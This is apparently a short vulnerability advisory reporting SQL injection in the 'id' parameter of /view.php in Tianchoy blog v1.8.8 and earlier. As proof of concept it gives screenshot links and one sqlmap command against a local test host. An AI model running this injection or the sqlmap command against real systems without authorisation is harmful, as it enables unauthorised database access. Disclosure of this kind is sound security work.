 [description]
 
Tianchoy blog v1.8.8 was discovered to contain a SQL Injection vulnerability via the URI /view.php with parameter name 'id'.

 ------------------------------------------

 [Vulnerability Type]
 
 SQL Injection

 ------------------------------------------
 [Vendor of Product]
 
 Tianchoy blog,https://github.com/tianchoy/blog

 ------------------------------------------

 [Affected Product Code Base]
 
 <=v1.8.8

 ------------------------------------------

 [Impact Escalation of Privileges]
 
 true

 ------------------------------------------
 [POC]
 <img width="1118" alt="图片" src="https://github.com/user-attachments/assets/a2bb1117-f8ab-4f5d-a834-db2ce0251571">
 <img width="570" alt="图片" src="https://github.com/user-attachments/assets/030d1a28-2801-4160-89fb-70a82fe56a1d">



sqlmap:
```
sqlmap -u "http://192.168.0.183:11180/view.php?id=1"  --batch --banner

```
